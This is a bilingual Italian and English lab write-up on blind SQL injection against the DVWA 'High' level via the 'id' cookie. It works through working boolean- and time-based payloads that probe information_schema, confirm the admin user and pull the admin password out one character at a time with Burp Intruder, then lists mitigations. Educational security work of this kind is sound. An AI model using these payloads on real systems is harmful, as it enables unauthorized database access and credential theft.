
## SQL Injection – Blind (High) – Italiano

## Descrizione

Nel livello "High" di DVWA, l'applicazione prende un `User ID` da un campo popup e lo salva in un cookie (`id`).  
L'input non è trasmesso via GET o POST, ma il backend legge il valore del cookie per eseguire una query SQL.  
Il risultato della query è visibile solo indirettamente: la pagina principale restituisce `"exists"` o `"missing"`.

## Obiettivo

Verificare la vulnerabilità del campo `id` all'interno del cookie e ottenere la password dell'utente `admin` tramite tecniche di **Blind SQL Injection** (boolean-based e time-based).

## Ambiente di test

- DVWA livello: High  
- VirtualBox  
- Browser: Firefox  
- Strumenti: Burp Suite, DevTools

## Fasi dell'attacco

### 1. Identificazione del vettore di attacco

- L'ID viene inserito in un popup e viene settato tramite il cookie `id`.
- L'applicazione mostra `"Cookie ID set!"` e poi `"exists"` o `"missing"` nella pagina principale.
- Analizzando le richieste HTTP, si nota:

```
Cookie: id=1; PHPSESSID=...
```

---

### 2. Verifica della vulnerabilità

- Payload:

```sql
1' AND 1=1 -- -
```

→ Risposta: `exists`

- Payload:

```sql
1' AND 1=2 -- -
```

→ Risposta: `missing`

✅ Conferma di vulnerabilità a **Blind SQL Injection basata su booleani**.

---

### 3. Verifica Time-Based con SLEEP

- Payload:

```sql
1' AND SLEEP(5) -- -
```

→ Il server risponde dopo circa 5 secondi → `SLEEP()` eseguito correttamente.

---

### 4. Verifica dell'esistenza della tabella `users`

- Payload:

```sql
1' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='user')>0, SLEEP(5), 0) #
```

→ Nessun ritardo → `user` **non esiste**

- Payload:

```sql
1' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')>0, SLEEP(5), 0) #
```

→ Ritardo di 5 secondi → ✅ confermata l’esistenza della tabella `users`.

---

### 5. Verifica delle colonne

- Colonna `user`:

```sql
1' AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='user')>0, SLEEP(5), 0) #
```

→ Ritardo confermato → ✅ esiste `user`

- Colonna `password`:

```sql
1' AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password')>0, SLEEP(5), 0) #
```

→ Ritardo confermato → ✅ esiste `password`

---

### 6. Verifica dell'esistenza di `admin`

- Payload:

```sql
1' AND IF((SELECT COUNT(*) FROM users WHERE user='admin')>0, SLEEP(5), 0) #
```

→ Ritardo confermato → ✅ esiste l’utente `admin`

---

### 7. Esfiltrazione della password di `admin`

- Payload per primo carattere:

```sql
1' AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a', SLEEP(5), 0) #
```

- Utilizzando Burp Intruder e testando un carattere alla volta, si è ottenuta l'intera password.

- ⚠️ Si osserva che il database **non è case sensitive**, poiché rispondeva positivamente a confronti con lettere minuscole e maiuscole.

> ⚠️ I dati estratti non sono riportati per motivi etici.

---

## Considerazioni finali

Il livello "High" di DVWA mostra che anche con input indiretti (cookie) e interfacce limitate, un’applicazione può essere vulnerabile a SQLi.  
L’assenza di prepared statements e la mancata validazione dell’input lato server rendono possibile l’esfiltrazione completa di dati sensibili.

---

## Mitigazioni consigliate

- Usare **query parametrizzate** (prepared statements)  
- Evitare la costruzione dinamica di query con input utente  
- Validare e sanificare l’input, anche se proviene da cookie  
- Limitare i privilegi dell’utente DB  
- Monitorare e loggare le attività anomale

---
---
> ⚠️ **Disclaimer Legale**
> 
> Tutte le attività documentate in questa repository sono state svolte esclusivamente in ambienti controllati, progettati per essere vulnerabili (es. DVWA, TryHackMe, laboratori locali).  
> Nessuna di queste tecniche è stata applicata contro sistemi reali, pubblici o privati, senza autorizzazione esplicita.
> 
> Questa repository ha finalità puramente didattiche ed educative.  
> L’autore **non si assume alcuna responsabilità** per l’uso improprio delle informazioni qui contenute.
---
---

## SQL Injection – Blind (High) – English

## Description

In DVWA's "High" level, the application accepts a `User ID` via a popup, and stores it in a cookie (`id`).  
The query is executed based on that cookie, and the result is indirectly visible via "exists" or "missing" on the main page.

## Objective

Test whether the cookie field `id` is vulnerable to Blind SQL Injection and extract the password of user `admin` using boolean and time-based techniques.

## Test environment

- DVWA level: High  
- VirtualBox  
- Browser: Firefox  
- Tools: Burp Suite, DevTools

## Attack steps

### 1. Injection vector identification

- Input from popup is stored in the cookie `id`.
- Application shows "Cookie ID set!" and then "exists"/"missing".
- Request example:

```
Cookie: id=1; PHPSESSID=...
```

---

### 2. Vulnerability check

- Payload:

```sql
1' AND 1=1 -- -
```

→ Response: `exists`

- Payload:

```sql
1' AND 1=2 -- -
```

→ Response: `missing`

✅ Boolean-based Blind SQL Injection confirmed.

---

### 3. Time-based verification

- Payload:

```sql
1' AND SLEEP(5) -- -
```

→ Delay confirms execution of `SLEEP()`.

---

### 4. Check for table `users`

- `user`: no delay → does not exist  
- `users`: delay → ✅ exists

---

### 5. Column checks

- `user` → delay → ✅ exists  
- `password` → delay → ✅ exists

---

### 6. Check for `admin` user

```sql
1' AND IF((SELECT COUNT(*) FROM users WHERE user='admin')>0, SLEEP(5), 0) #
```

→ Delay confirms user `admin` exists.

---

### 7. Password extraction

- Payload (first character test):

```sql
1' AND IF(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='a', SLEEP(5), 0) #
```

- Repeated character-based extraction revealed full password.
- ⚠️ DB was not case-sensitive.

> ⚠️ Extracted password omitted for ethical reasons.

---

## Final thoughts

This test demonstrates that even cookies can become dangerous injection vectors when input is not sanitized.  
The vulnerability allowed complete password extraction despite UI restrictions.

---

## Recommended mitigations

- Use **parameterized queries**  
- Never construct queries dynamically with user input  
- Always validate/sanitize input, including from cookies  
- Apply strict DB user permissions  
- Log and monitor unusual activity
---
---
> ⚠️ **Legal Disclaimer**
> 
> All activities documented in this repository were performed **exclusively in controlled environments** specifically designed to be vulnerable (e.g., DVWA, TryHackMe, local labs).
> 
> None of the techniques shown here were executed against real, public, or private systems without explicit authorization.
> 
> This repository is intended **solely for educational and training purposes**.
> 
> The author **assumes no responsibility** for any misuse of the information provided herein.
---
---
